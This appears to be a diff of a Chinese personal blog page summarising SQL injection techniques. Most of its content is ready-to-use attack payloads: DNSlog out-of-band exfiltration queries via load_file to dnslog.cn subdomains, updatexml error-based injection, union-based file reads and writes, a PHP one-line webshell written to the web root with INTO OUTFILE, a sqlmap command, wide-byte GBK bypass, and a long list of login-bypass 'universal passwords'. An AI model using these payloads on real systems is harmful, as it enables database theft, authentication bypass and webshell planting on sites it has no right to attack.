@@ -8,7 +8,7 @@
   
   
   
-  <title>SQL注入-总结 | JohnScott2046的博客</title>
+  <title>23SQL注入-总结 | JohnScott2046的博客</title>
 
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 
@@ -254,7 +254,7 @@
 
 <div class="post">
   <h1 class="article-title">
-    <span>SQL注入-总结</span>
+    <span>23SQL注入-总结</span>
   </h1>
   <div class="article-top-meta">
     <span>
@@ -281,6 +281,16 @@
   <div class="article-content">
     <div class="markdown-body">
       <h2 id="SQL注入-总结"><a href="#SQL注入-总结" class="headerlink" title="SQL注入-总结"></a>SQL注入-总结</h2><p>只要输入的特定语句，被网站执行，就说明网站存在注入漏洞</p>
+<h2 id="几种常见的sql-mode"><a href="#几种常见的sql-mode" class="headerlink" title="几种常见的sql_mode"></a>几种常见的sql_mode</h2><p>ONLY_FULL_GROUP_BY：出现在select语句、HAVING条件和ORDER BY语句中的列，必须是GROUP BY的列或者依赖于GROUP BY列的函数列。</p>
+<p>NO_AUTO_VALUE_ON_ZERO：该值影响自增长列的插入。默认设置下，插入0或NULL代表生成下一个自增长值。如果用户希望插入的值为0，而该列又是自增长的，那么这个选项就有用了。</p>
+<p>STRICT_TRANS_TABLES：在该模式下，如果一个值不能插入到一个事务表中，则中断当前的操作，对非事务表不做限制</p>
+<p>NO_ZERO_IN_DATE：这个模式影响了是否允许日期中的月份和日包含0。如果开启此模式，2016-01-00是不允许的，但是0000-02-01是允许的。它实际的行为受到 strict mode是否开启的影响1。</p>
+<p>NO_ZERO_DATE：设置该值，mysql数据库不允许插入零日期。它实际的行为受到 strictmode是否开启的影响2。</p>
+<p>ERROR_FOR_DIVISION_BY_ZERO：在INSERT或UPDATE过程中，如果数据被零除，则产生错误而非警告。如果未给出该模式，那么数据被零除时MySQL返回NULL</p>
+<p>NO_AUTO_CREATE_USER：禁止GRANT创建密码为空的用户</p>
+<p>NO_ENGINE_SUBSTITUTION：如果需要的存储引擎被禁用或未编译，那么抛出错误。不设置此值时，用默认的存储引擎替代，并抛出一个异常</p>
+<p>PIPES_AS_CONCAT：将”||”视为字符串的连接操作符而非或运算符，这和Oracle数据库是一样的，也和字符串的拼接函数Concat相类似</p>
+<p>ANSI_QUOTES：启用ANSI_QUOTES后，不能用双引号来引用字符串，因为它被解释为识别符</p>
 <h3 id="一、-DNSlog注入"><a href="#一、-DNSlog注入" class="headerlink" title="一、 DNSlog注入"></a>一、 DNSlog注入</h3><p>oob  out of band 数据带外</p>
 <p>核心：将盲注内容转化为显示错误，oob在sql注入中的应用</p>
 <p>适用场景：<br>    某些无法直接利用漏洞获得回显的情况下，但是目标可以发起请求，这是可以通过DNSlog注入把想获得的数据外带出来；<br>    将select的数据发送一个url，利用dns解析产生的记录日志来查看数据</p>
@@ -301,10 +311,19 @@
 <p>读取文件<br>select load_file(CONCAT(‘//‘, (select database()), ‘.cy1nlz.dnslog.cn/1.txt’))</p>
 <p>select load_file(CONCAT(‘//‘, (select group_concat(table_name) from information_schema.tables where table_schema=dnslog and table_name like ‘%flag%’), ‘.cy1nlz.dnslog.cn/1.txt’))</p>
 <p>1%20and%20id%20in(select load_file(CONCAT(‘//‘, (), ‘.0u0y7y.dnslog.cn/1.txt’)))%20–+</p>
+<h3 id="post注入"><a href="#post注入" class="headerlink" title="post注入"></a>post注入</h3><p>使用burp抓包 =&gt; 右键 =&gt;  copy to file</p>
+<p>sqlmap.py -r “/mnt/hgfs/www/1.txt” -p n –dbs</p>
+<h3 id="一句話木馬"><a href="#一句話木馬" class="headerlink" title="一句話木馬"></a>一句話木馬</h3><p>1’ union select 1,2,3 into outfile ‘’ – qwe</p>
+<p>select ‘<?php eval($_POST[cmd]);?>‘ into outfile ‘/www/log.php’</p>
 <h3 id="head注入"><a href="#head注入" class="headerlink" title="head注入"></a>head注入</h3><p>head多数都需要用户成功登录网站的，网站有时会记录一些head信息，存入数据库，可能会存在head注入</p>
 <p>报错注入</p>
 <p>‘ or udpatexml(1, concat(0x7e, (seelct version() ) ), 1), 1) –+<br>udpatexml 能够将数据库语句执行，并且伴随着数据库报错显示出来</p>
 <p>user-agent<br>refere<br>X-Forwarded-for</p>
+<h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><p>PHP utf-8编码 数据库GBK编码</p>
+<p>PHP防御函数：magic_quotes_gpc()</p>
+<p>成因：PHP发送请求到mysql时经过一次gbk编码，PHP会将获取到的数据进行魔术引号的处理，因为GBK是双字节编码，所以我们提交的%df这个字符和转译的反斜杠组成了新的汉字，然后数据库处理的时候是根据GBK去处理的，然后单引号就逃逸了出来。</p>
+<p>原理：在数据库中使用宽字符集，在web中没有考虑这个问题。由于0XDF27在web中是两个字符，在php中会对0x27进行转义，把0XDF27变成0XDF5c27</p>
+<p>gbk编码 %df<br>使用mysql_set_charset(GBK)指定字符集</p>
 <h3 id="soap注入"><a href="#soap注入" class="headerlink" title="soap注入"></a>soap注入</h3><p>soap注入就是在webservice的soap协议，连接web服务和客户端的接口处的注入，通过在发送的soap消息参数内添加注入语句来达到注入效果，常见的有sql注入，也有xml注入，代码注入</p>
 <p>什么是soap</p>
 <p>首先介绍webservice，webservice是一种跨平台，跨语言的规范，用于不同平台，不同语言间的交互</p>
@@ -377,7 +396,39 @@
 <p>查询所有列<br>1” union select(!(select * from (select group_concat(column_name) from information_schema. columns where table_name=”users”)x) -~0),2,3%23</p>
 <p>—SQL读、写文件——————————————–<br>1’ union select 1,2,3 into file “/var/www/html/a.txt”#<br>1’ union select 1,’<?php phpinfo();?>‘,3 into file “/var/www/html/a.txt”#</p>
 <p>-1’ union select 1,load file(“/var/www/html/a.txt”),3#</p>
-<p>2021年-Kali安全渗透+Web白帽子高级工程师+黑客攻防-基础VIP课程<br><a target="_blank" rel="noopener" href="https://ke.qq.com/course/1583231?taid=7368664937932927&amp;tuin=6a07dc75">https://ke.qq.com/course/1583231?taid=7368664937932927&amp;tuin=6a07dc75</a><br>有一些基础，可以看一下下面的视频资料<br>1、实战：搭建蜜罐系统捕捉黑客操作的步骤<br>链接: <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1NdkqrqPAGz3EY9IouEoZ_g">https://pan.baidu.com/s/1NdkqrqPAGz3EY9IouEoZ_g</a> 提取码: smui<br>2、实战-揭密克隆网站和钓鱼网站背后的技术<br>链接：<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1piyXcUKEtq9WtdVUi5b3PA">https://pan.baidu.com/s/1piyXcUKEtq9WtdVUi5b3PA</a> 提取码：huz3<br>3、实战-使用SQLmap进行sql注入并获得后台管理员adnim帐号和密码<br>链接：<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/10O0JLCwm7NNRIxpMnLfG-Q">https://pan.baidu.com/s/10O0JLCwm7NNRIxpMnLfG-Q</a> 提取码：91sk<br>4、实战：使用msfvenom生成快播和西瓜影音看片神器后门木马<br>链接：<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1GyFF3o0N0kSThYbsjNp6nA">https://pan.baidu.com/s/1GyFF3o0N0kSThYbsjNp6nA</a> 提取码：2hlf</p>
+<h3 id="后台登陆万能密码"><a href="#后台登陆万能密码" class="headerlink" title="后台登陆万能密码"></a>后台登陆万能密码</h3><p>asp aspx万能密码</p>
+<p>admin ‘and ‘1’=’1<br>           ‘ar ‘1’=’1<br>admin ‘or ‘1’=’1</p>
+<pre><code> &quot;or &quot;a&quot;=&quot;a
+ &#39;)or(&#39;a&#39;=&#39;a
+ or 1=1--
+ &#39;or 1=1--
+ a&#39;or&#39; 1=1--
+ &quot;or 1=1--
+ &#39;or&#39;a&#39;=&#39;a
+ &quot;or&quot;=&quot;a&#39;=&#39;a
+ &#39;or&#39;&#39;=&#39;
+ &#39;or&#39;=&#39;or&#39;
+ 1 or &#39;1&#39;=&#39;1&#39;=1
+ 1 or &#39;1&#39;=&#39;1&#39; or 1=1
+ &#39;OR 1=1%00
+ &quot;or 1=1%00
+ &#39;xor
+ 新型万能登陆密码
+
+      用户名 &#39; UNION Select 1,1,1 FROM admin Where &#39;&#39;=&#39; （替换表名admin）
+      密码 1
+
+      Username=-1%cf&#39; union select 1,1,1 as password,1,1,1 %23
+      Password=1</code></pre>
+<p>   17 ..admin’ or ‘a’=’a 密码随便</p>
+<p>PHP万能密码</p>
+<pre><code>   &#39;or&#39;=&#39;or&#39;
+   &#39;or 1=1/* 字符型 GPC是否开都可以使用
+   User: something      Pass: &#39; OR &#39;1&#39;=&#39;1</code></pre>
+<p>jsp万能密码</p>
+<pre><code>   1&#39;or&#39;1&#39;=&#39;1
+   admin&#39; OR 1=1/*
+   用户名：admin 系统存在这个用户的时候 才用得上     密码：1&#39;or&#39;1&#39;=&#39;1</code></pre>
     </div>
   </div>
   
@@ -480,13 +531,13 @@
       <div class="nav-pre">
         <i class="iconfont icon-prev"></i>
         上一篇:
-        <a href="/2021/24XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB%E5%9F%BA%E7%A1%80/" target="_self">XSS跨站脚本攻击基础</a>
+        <a href="/2021/24XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB%E5%9F%BA%E7%A1%80/" target="_self">24XSS跨站脚本攻击基础</a>
       </div>
     
     
       <div class="nav-next">
         下一篇:
-        <a href="/2021/26CSRF%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/" target="_self">CSRF跨站请求伪造</a>
+        <a href="/2021/26CSRF%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/" target="_self">26CSRF跨站请求伪造</a>
         <i class="iconfont icon-next"></i>
       </div>
     
